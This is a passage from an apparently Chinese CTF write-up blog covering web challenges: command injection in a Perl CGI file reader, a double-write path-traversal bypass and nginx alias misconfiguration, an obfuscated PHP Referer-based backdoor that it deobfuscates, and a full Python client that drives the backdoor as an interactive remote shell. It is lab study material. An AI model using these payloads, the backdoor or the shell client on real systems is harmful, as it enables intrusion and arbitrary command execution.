<p><img src="https://i.loli.net/2020/12/09/UdBY7aruk2JhXim.png" srcset="/img/loading.gif" alt="image-20201209092628853"></p>
<p><img src="https://i.loli.net/2020/12/09/n6DmvYEfM8HeI4h.png" srcset="/img/loading.gif" alt="image-20201209091529965"></p>
<ol start="2">
<li><p>先读取file.pl文件，盲猜在/var/www/cgi-bin/file.pl，将3部分payload修改 为：/cgi­bin/file.pl?/var/www/cgi-bin/file.pl </p>
</li>
<li><p>利用bash来进行读取当前目录下的文件，将3部分payload修改为：/cgibin/file.pl?/bin/bash%20­c%20ls${IFS}/| </p>
<p><img src="https://i.loli.net/2020/12/09/7g6WiKyzYG5vQsd.png" srcset="/img/loading.gif" alt="image-20201209093015408"></p>
</li>
<li><p>读取当前目录的flag文件内容,将3部分payload修改为：/cgi­bin/file.pl?/flag</p>
</li>
</ol>
<p><img src="https://i.loli.net/2020/12/09/n7xUhu69oBfGwaM.png" srcset="/img/loading.gif" alt="image-20201209092658534"></p>
<p><a href="https://adworld.xctf.org.cn/task/writeup?type=web&id=5001&number=3&grade=1&page=2" target="_blank" rel="noopener">参考</a></p>
<h2 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h2><h3 id="0x1信息收集"><a href="#0x1信息收集" class="headerlink" title="0x1信息收集"></a>0x1信息收集</h3><p>进入页面发现要登录，但是没有账号，扫描目录也没发现注册账号的页面，但是发现了robots.txt，其中给了hint.php和hack.php</p>
<p>hint.php</p>
<div class="hljs"><pre><code class="hljs awk">配置文件也许有问题呀：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>site.conf</code></pre></div>

<p>还有这几个</p>
<p><img src="https://i.loli.net/2020/12/09/iDh1arKt2lNRfxk.png" srcset="/img/loading.gif" alt="image-20201209100341300"></p>
<p>抓包发现cookie，将其改为1后发现就可以登录了，这里是使用浏览器的cookie编辑插件</p>
<p><img src="https://i.loli.net/2020/12/09/fk6YVQZIFruy8ov.png" srcset="/img/loading.gif" alt="image-20201209095233466"></p>
<p>登录后的url</p>
<div class="hljs"><pre><code class="hljs pgsql">http://<span class="hljs-number">220.249</span><span class="hljs-number">.52</span><span class="hljs-number">.133</span>:<span class="hljs-number">35234</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?file=<span class="hljs-keyword">index</span>&amp;ext=php</code></pre></div>

<h2 id="0x2读取配置文件"><a href="#0x2读取配置文件" class="headerlink" title="0x2读取配置文件"></a>0x2读取配置文件</h2><p>尝试读取index.php和admin.php源码都失败了，再试试robots.txt中的页面</p>
<p>直接输入路径会跳转到主页不显示内容，可能存在过滤导致文件路径无效</p>
<div class="hljs"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div>

<p>用双写绕过</p>
<div class="hljs"><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div>

<p>拿到了配置文件</p>
<div class="hljs"><pre><code class="hljs stata">server &#123;
    listen 8080; ## listen <span class="hljs-keyword">for</span> ipv4; this <span class="hljs-keyword">line</span> is default and implied
    listen [::]:8080; ## listen <span class="hljs-keyword">for</span> ipv6

    root /<span class="hljs-keyword">var</span>/www/html;
    index index.php index.html index.htm;
    port_in_redirect off;
    server_name _;

    # Make site accessible from http:<span class="hljs-comment">//localhost/</span>
    #server_name localhost;

    # <span class="hljs-keyword">If</span> block <span class="hljs-keyword">for</span> setting the time <span class="hljs-keyword">for</span> the logfile
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">"^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)"</span>) &#123;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$year</span> <span class="hljs-variable">$1</span>;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$month</span> <span class="hljs-variable">$2</span>;
       <span class="hljs-keyword">set</span> <span class="hljs-variable">$day</span> <span class="hljs-variable">$3</span>;
    &#125;
    # Disable sendfile <span class="hljs-keyword">as</span> per https:<span class="hljs-comment">//docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>
    sendfile off;

        <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;
                <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$1</span>???;
        &#125;

    # Add stdout logging

    access_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.<span class="hljs-keyword">log</span> openshift_log;
    error_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span> info;

    location / &#123;
        # First attempt to serve request <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>, then
        # <span class="hljs-keyword">as</span> directory, then fall back to index.html
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
        server_tokens off;
    &#125;

    #error_page 404 /404.html;

    # redirect server <span class="hljs-keyword">error</span> pages to the static page /50x.html
    #
    error_page 500 502 503 504 /50x.html;
    location = /50x.html &#123;
        root /usr/share/nginx/html;
    &#125;
    location ~ \.php$ &#123;
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/php/php5.6-fpm.sock;
        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;
        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;
        fastcgi_index index.php;
        <span class="hljs-keyword">include</span> fastcgi_params;
        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;
    &#125;

    location ~ /\. &#123;
            log_not_found off;
            deny all;
    &#125;
    location /web-img &#123;  <span class="hljs-comment">//这里存在问题</span>
  
        alias /images/;
        autoindex <span class="hljs-keyword">on</span>;
    &#125;
    location ~* \.(ini|docx|pcapng|doc)$ &#123;  
         deny all;  
    &#125;  
    <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]<span class="hljs-keyword">conf</span>;</code></pre></div>

<p>这个文件内容也看不懂，但是知道这里存在问题</p>
<div class="hljs"><pre><code class="hljs nginx"><span class="hljs-attribute">location</span> /web-img &#123; 
    <span class="hljs-attribute">alias</span> /images/;
    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;
&#125;</code></pre></div>

<p><strong>alias</strong>,就是给 /web-img，设置了一个别名，当访问/web-img就相当于访问了 /images/</p>
<div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">^~ /t</span>/ &#123;
 alias /www/root/html/new_t/;
&#125;</code></pre></div>

<p>如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
<p><strong>autoindex</strong> </p>
<p>Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件或你要启用目录浏览虚拟主机的配置文件，在server或location 段里添加上autoindex on</p>
<p>这里将其打开就会导致我们可以访问根目录的所有文件夹</p>
<p>url</p>
<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/web-img../</span>
<span class="hljs-regexp">//</span>    web-img..<span class="hljs-regexp">/  == /im</span>age<span class="hljs-regexp">/../</span> 相当于回退到了根目录</code></pre></div>



<h3 id="0x3发现漏洞"><a href="#0x3发现漏洞" class="headerlink" title="0x3发现漏洞"></a>0x3发现漏洞</h3><p>在/var/www/中发现了一个hack..php.bak，正好是robots.txt中提示的内容</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$U=<span class="hljs-string">'_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle'</span>;
$q=<span class="hljs-string">'s[|U$i]="";$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui'</span>;
$M=<span class="hljs-string">'l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$'</span>;
$z=<span class="hljs-string">'r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r'</span>;
$k=<span class="hljs-string">'?:;q=0.([\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s'</span>;
$o=<span class="hljs-string">'|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r'</span>;
$N=<span class="hljs-string">'|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/'</span>;
$C=<span class="hljs-string">'an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U&lt;$k&gt;$d&lt;/$k&gt;"|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;'</span>;
$j=<span class="hljs-string">'$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i&lt;'</span>;
$R=str_replace(<span class="hljs-string">'rO'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'rOcreatrOe_rOrOfurOncrOtion'</span>);
$J=<span class="hljs-string">'kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$'</span>;
$x=<span class="hljs-string">'r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\|U|Uw])[|U\\w-]+|U('</span>;
$f=str_replace(<span class="hljs-string">'|U'</span>,<span class="hljs-string">''</span>,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
$g=create_function(<span class="hljs-string">''</span>,$f);
$g();
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>又是一段奇奇怪怪的代码</p>
<p>但是能看懂最后三行是生成了一个$g函数，而且是由$f生成的，那么久将$f打印出来看看，在线格式化后如下</p>
<p>是一个后门程序，但是如何利用是个问题，实在太菜了，都看不懂写的是什么，只好找到wp</p>
<div class="hljs"><pre><code class="hljs php">$kh=<span class="hljs-string">"42f7"</span>;
$kf=<span class="hljs-string">"e9ac"</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span><span class="hljs-params">($t,$k)</span> </span>&#123;
	$c=strlen($k);
	$l=strlen($t);
	$o=<span class="hljs-string">""</span>;
	<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>;$i&lt;$l;) &#123;
		<span class="hljs-keyword">for</span> ($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;
			$o.=$t &#123;
				$i
			&#125;
			^$k &#123;
				$j
			&#125;
			;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> $o;
&#125;
$r=$_SERVER;
$rr=@$r[<span class="hljs-string">"HTTP_REFERER"</span>];
$ra=@$r[<span class="hljs-string">"HTTP_ACCEPT_LANGUAGE"</span>];
<span class="hljs-keyword">if</span>($rr&amp;&amp;$ra) &#123;
	$u=parse_url($rr);
	parse_str($u[<span class="hljs-string">"query"</span>],$q);
	$q=array_values($q);
	preg_match_all(<span class="hljs-string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);
	<span class="hljs-keyword">if</span>($q&amp;&amp;$m) &#123;
		@session_start();
		$s=&amp;$_SESSION;
		$ss=<span class="hljs-string">"substr"</span>;
		$sl=<span class="hljs-string">"strtolower"</span>;
		$i=$m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].$m[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];
		$h=$sl($ss(md5($i.$kh),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
		$f=$sl($ss(md5($i.$kf),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
		$p=<span class="hljs-string">""</span>;
		<span class="hljs-keyword">for</span> ($z=<span class="hljs-number">1</span>;$z&lt;count($m[<span class="hljs-number">1</span>]);$z++)$p.=$q[$m[<span class="hljs-number">2</span>][$z]];
		<span class="hljs-keyword">if</span>(strpos($p,$h)===<span class="hljs-number">0</span>) &#123;
			$s[$i]=<span class="hljs-string">""</span>;
			$p=$ss($p,<span class="hljs-number">3</span>);
		&#125;
		<span class="hljs-keyword">if</span>(array_key_exists($i,$s)) &#123;
			$s[$i].=$p;
			$e=strpos($s[$i],$f);
			<span class="hljs-keyword">if</span>($e) &#123;
				$k=$kh.$kf;
				ob_start();
				@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"/_/"</span>,<span class="hljs-string">"/-/"</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"+"</span>),$ss($s[$i],<span class="hljs-number">0</span>,$e))),$k)));
				$o=ob_get_contents();
				ob_end_clean();
				$d=base64_encode(x(gzcompress($o),$k));
				<span class="hljs-keyword">print</span>(<span class="hljs-string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);
				@session_destroy();
			&#125;
		&#125;
	&#125;
&#125;</code></pre></div>

<p>做个分析</p>
<ul>
<li>先是预定义阶段 , 定义了两个字符串和一个 <code>x()</code> 函数</li>
<li>然后获取攻击者发送的数据 , 这里攻击代码是通过 Referer 字段传输的</li>
<li>注意正则函数 preg_match_all() , 该函数从 <a href="https://blog.csdn.net/qq_40491569/article/details/83472556" target="_blank" rel="noopener">Accept-Language</a> 取值 , 然后通过正则匹配后输出到 <code>$m</code> 数组中</li>
<li>然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量</li>
<li>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 Referer 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload .</li>
<li>然后判断 <code>$h</code> 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code> , 同时删除 Payload 的 $h 部分 .</li>
<li>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</li>
<li>最后执行payload</li>
</ul>
<p>exp：</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

<span class="hljs-comment"># 用于生成完整的 Accept-Language</span>
<span class="hljs-keyword">from</span> urllib3.connectionpool <span class="hljs-keyword">import</span> xrange
<span class="hljs-keyword">from</span> yapf.yapflib.py3compat <span class="hljs-keyword">import</span> raw_input


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span><span class="hljs-params">(seq,amount)</span>:</span>
    length = len(seq)
    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:
        print(<span class="hljs-string">'Error Input'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    result = []    <span class="hljs-comment"># 结果</span>
    indexes = []    <span class="hljs-comment"># 索引</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> count &lt; amount:
        i = randint(<span class="hljs-number">0</span>,length<span class="hljs-number">-1</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:
            indexes.append(i)
            result.append(seq[i])
            count += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> count == amount:
                <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span><span class="hljs-params">(amount)</span>:</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
        result += chr(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))
    <span class="hljs-keyword">return</span>  result

<span class="hljs-comment"># 生成随机填充字符串( 由所有大小写字母组成 )</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span><span class="hljs-params">(amount)</span>:</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
        <span class="hljs-comment"># choice() 方法返回一个列表，元组或字符串的随机项</span>
        <span class="hljs-comment"># string.ascii_letters 会生成所有的字母</span>
        result += choice(string.ascii_letters)
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 模拟 x() 函数 , 循环异或加密</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span><span class="hljs-params">(text,key)</span>:</span>
    result = <span class="hljs-string">''</span>
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:
        iKey = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += <span class="hljs-number">1</span>
            iKey += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 开启 Debug 选项</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span><span class="hljs-params">(msg)</span>:</span>
    <span class="hljs-keyword">if</span> debugging:
        <span class="hljs-keyword">print</span> (msg)

<span class="hljs-comment"># 定义基本变量</span>
debugging = <span class="hljs-literal">False</span>    <span class="hljs-comment"># 默认关闭 Debug , 可用 True 开启</span>
keyh = <span class="hljs-string">"42f7"</span>    <span class="hljs-comment"># $kh , 需要修改</span>
keyf = <span class="hljs-string">"e9ac"</span>    <span class="hljs-comment"># $kf , 需要修改</span>
xorKey = keyh + keyf    <span class="hljs-comment"># $k</span>
url = <span class="hljs-string">'http://111.198.29.45:47960/hack.php'</span>    <span class="hljs-comment"># 指定 URL  , 需要修改</span>
defaultLang = <span class="hljs-string">'zh-CN'</span>    <span class="hljs-comment">#默认Language</span>
languages = [<span class="hljs-string">'zh-TW;q=0.%d'</span>,<span class="hljs-string">'zh-HK;q=0.%d'</span>,<span class="hljs-string">'en-US;q=0.%d'</span>,<span class="hljs-string">'en;q=0.%d'</span>]    <span class="hljs-comment">#Accept-Language 模板</span>
proxies = <span class="hljs-literal">None</span>    <span class="hljs-comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # 代理 , 可用于 BurpSuite 等</span>
sess = requests.Session()    <span class="hljs-comment"># 创建一个 SESSION 对象</span>

<span class="hljs-comment"># 每次会话会产生一次随机的 Accept-Language</span>
langTmp = choicePart(languages,<span class="hljs-number">3</span>)    <span class="hljs-comment"># 输出一个列表 , 包含模板中的三种 Accept-language</span>
indexes = sorted(choicePart(range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># 降序排序输出三个权重值 , 例如 [8,6,4]</span>

acceptLang = [defaultLang]   <span class="hljs-comment"># 先添加默认Language</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
    acceptLang.append(langTmp[i] % (indexes[i],))    <span class="hljs-comment"># 然后循环添加三种 Accept-Language , 并为其添加权重值</span>
acceptLangStr = <span class="hljs-string">','</span>.join(acceptLang)    <span class="hljs-comment"># 将多个 Accept-Language 用 " , " 拼接在一起</span>
<span class="hljs-comment"># acceptLangStr 即为要使用的 Accept-Language</span>
debugPrint(acceptLangStr)

init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]    <span class="hljs-comment"># $i</span>
md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]    <span class="hljs-comment"># $h</span>
md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))    <span class="hljs-comment"># $f + 填充字符串</span>
debugPrint(<span class="hljs-string">'$i is %s'</span> % (init2Char))
debugPrint(<span class="hljs-string">'md5 head: %s'</span> % (md5head,))
debugPrint(<span class="hljs-string">'md5 tail: %s'</span> % (md5tail,))

<span class="hljs-comment"># 交互式 Shell</span>
cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span>
<span class="hljs-keyword">while</span> cmd != <span class="hljs-string">''</span>:
    <span class="hljs-comment"># 在写入 Payload 前填充一些无关数据</span>
    query = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(max(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):
        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))
        query.append((key, value))    <span class="hljs-comment"># 生成无关数据并填充</span>
    debugPrint(<span class="hljs-string">'Before insert payload:'</span>)
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    <span class="hljs-comment"># 对 Payload 进行加密</span>
    payload = zlib.compress(cmd)    <span class="hljs-comment"># gzcompress 操作</span>
    payload = loopXor(payload,xorKey)    <span class="hljs-comment"># 循环异或运算 , PHP代码中的 x() 函数</span>
    payload = base64.urlsafe_b64encode(payload)    <span class="hljs-comment"># base64_encode 编码</span>
    payload = md5head + payload    <span class="hljs-comment">#    在开头补全$h</span>

    <span class="hljs-comment">#  对Payload进行修改</span>
    cutIndex = randint(<span class="hljs-number">2</span>,len(payload)<span class="hljs-number">-3</span>)
    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)
    iPiece = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:
        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])
        iPiece += <span class="hljs-number">1</span>
    <span class="hljs-comment"># 将 Payload 作为查询字符串编码拼接到 Referer 中</span>
    referer = url + <span class="hljs-string">'?'</span> + urllib.urlencode(query)
    debugPrint(<span class="hljs-string">'After insert payload, referer is:'</span>)
    debugPrint(query)
    debugPrint(referer)

    <span class="hljs-comment"># 发送 HTTP GET 请求</span>
    r = sess.get(url,headers=&#123;<span class="hljs-string">'Accept-Language'</span>:acceptLangStr,<span class="hljs-string">'Referer'</span>:referer&#125;,proxies=proxies)
    html = r.text
    debugPrint(html)

    <span class="hljs-comment"># 接收响应数据包</span>
    pattern = re.compile(<span class="hljs-string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))
    output = pattern.findall(html)
    <span class="hljs-comment"># 如果没有收到响应数据包</span>
    <span class="hljs-keyword">if</span> len(output) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">print</span> (<span class="hljs-string">'Error,  no backdoor response'</span>)
        cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span>
        <span class="hljs-keyword">continue</span>
    <span class="hljs-comment"># 如果收到响应数据包 , 则对其进行处理</span>
    output = output[<span class="hljs-number">0</span>]
    debugPrint(output)
    output = output.decode(<span class="hljs-string">'base64'</span>)    <span class="hljs-comment"># base64_decode 解码</span>
    output = loopXor(output,xorKey)    <span class="hljs-comment"># 循环异或运算</span>
    output = zlib.decompress(output)   <span class="hljs-comment"># gzuncompress 运算</span>
    print(output)    <span class="hljs-comment"># 输出响应信息</span>
    cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span></code></pre></div>



<p>难度属实有点大了，超出能力范围。</p>
<p>参考</p>
<blockquote>
<p><a href="https://www.guildhab.top/?p=1474" target="_blank" rel="noopener">Web_php_wrong_nginx_config WriteUp – H0t-A1r-B4llo0n (guildhab.top)</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/107801811" target="_blank" rel="noopener">(2条消息) 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config_闵行小鱼塘-CSDN博客</a></p>
</blockquote>
<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>这出题人大意了啊。。。直接可以给显示出来了</p>
<p><img src="https://i.loli.net/2020/12/05/bPZfgzaGHwDoinr.png" srcset="/img/loading.gif" alt="image-20201205201112120"></p>
<p>还是正常做一做，这题好像有问题，就在buuctf上做了</p>
<h3 id="0x1代码审计-1"><a href="#0x1代码审计-1" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-comment">//例子 c=20-1</span>
    $content = $_GET[<span class="hljs-string">'c'</span>];
    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);
    &#125;
    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
